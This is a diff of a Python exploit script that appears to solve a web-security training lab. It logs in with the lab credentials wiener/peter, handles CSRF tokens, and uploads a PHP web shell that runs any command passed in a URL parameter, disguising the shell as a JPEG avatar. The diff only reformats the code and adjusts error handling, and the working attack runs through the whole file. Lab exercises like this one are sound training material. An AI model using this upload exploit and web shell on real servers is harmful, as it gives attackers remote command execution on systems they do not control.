@@ -1,8 +1,6 @@
 import requests
 import sys
 from bs4 import BeautifulSoup
-from requests.adapters import HTTPAdapter, Retry
-
 
 
 def extract_csrf_token(response):
@@ -15,13 +13,7 @@ def login(url, session):
     response = session.get(f"{url}/login", timeout=10)
     if response.status_code == 200:
         csrf_token = extract_csrf_token(response)
-
-        login_data = {
-            "csrf": csrf_token,
-            "username": "wiener",
-            "password": "peter"
-        }
-
+        login_data = {"csrf": csrf_token,"username": "wiener","password": "peter"}
         login_response = session.post(f"{url}/login", data=login_data, timeout=10)
         return login_response.status_code == 200
 
@@ -29,16 +21,8 @@ def login(url, session):
 def upload_file(url, session):
     response = session.get(f"{url}/my-account")
     csrf_token = extract_csrf_token(response)
-
-    file = {
-        "avatar": ("webshell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg")
-    }
-
-    data = {
-        "user": "wiener",
-        "csrf": csrf_token
-    }
-
+    file = {"avatar": ("webshell.php", "<?php system($_GET['cmd']); ?>", "image/jpeg")}
+    data = {"user": "wiener","csrf": csrf_token}
     upload_response = session.post(f"{url}/my-account/avatar", files=file, data=data)
     return upload_response.status_code == 200
 
@@ -57,7 +41,7 @@ def main():
     try:
         url = sys.argv[1].rstrip("/")
         session = requests.Session()
-        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))
+        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))
 
         print("(+) Logging in...")
         if not login(url, session):
@@ -72,6 +56,7 @@ def main():
         else:
             print("(-) File Upload was unsuccessful.")
 
+
     except requests.exceptions.Timeout:
         print("(-) Request timed out.")
 
@@ -80,6 +65,9 @@ def main():
 
     except requests.exceptions.ConnectionError:
         print("(-) Unable to connect to host. Please check your URL and try again.")
+
+    except KeyboardInterrupt:
+        sys.exit(1)
 
 
 if __name__ == "__main__":
